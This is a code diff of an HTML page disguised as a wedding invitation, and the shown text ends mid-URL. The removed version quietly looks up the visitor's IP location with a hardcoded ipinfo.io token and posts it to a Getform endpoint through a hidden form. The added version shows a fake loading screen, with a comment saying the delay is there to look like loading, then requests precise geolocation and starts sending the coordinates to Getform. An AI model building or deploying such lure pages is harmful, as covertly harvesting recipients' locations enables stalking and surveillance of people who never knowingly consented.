@@ -2,32 +2,57 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Wedding Invitation</title>
-  <script>
-    function sendLocation(locationData) {
-      const form = document.createElement('form');
-      form.action = "https://getform.io/f/bnlqdjlb"; // <-- your Getform URL
-      form.method = "POST";
-
-      const locField = document.createElement('input');
-      locField.type = "hidden";
-      locField.name = "Location Info";
-      locField.value = JSON.stringify(locationData);
-
-      form.appendChild(locField);
-      document.body.appendChild(form);
-      form.submit();
+  <title>You're Invited!</title>
+  <style>
+    body {
+      background: #f9f9f9;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
     }
-
-    // Replace 'YOUR_TOKEN_HERE' with your actual IPinfo token
-    fetch('https://ipinfo.io/json?token=61dbbadd671897')  // Use your real token here
-      .then(response => response.json())
-      .then(data => {
-        console.log("User location data:", data);
-        sendLocation(data); // Send captured location info
-      })
-      .catch(error => console.error('Error:', error));
-  </script>
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 2s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h1 {
+      color: #333;
+    }
+    p {
+      color: #777;
+    }
+  </style>
 </head>
 <body>
-  <h1>
+
+  <h1>You're Invited to Our Wedding!</h1>
+  <div class="loader"></div>
+  <p>Preparing your special invitation... Please wait...</p>
+
+  <script>
+    // Delay to make it look like loading
+    setTimeout(function() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(success, error);
+      } else {
+        alert("Geolocation is not supported by your browser.");
+      }
+    }, 2000);
+
+    function success(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      console.log("Latitude: " + latitude);
+      console.log("Longitude: " + longitude);
+
+      // Send location to Getform
+      fetch("https://getform
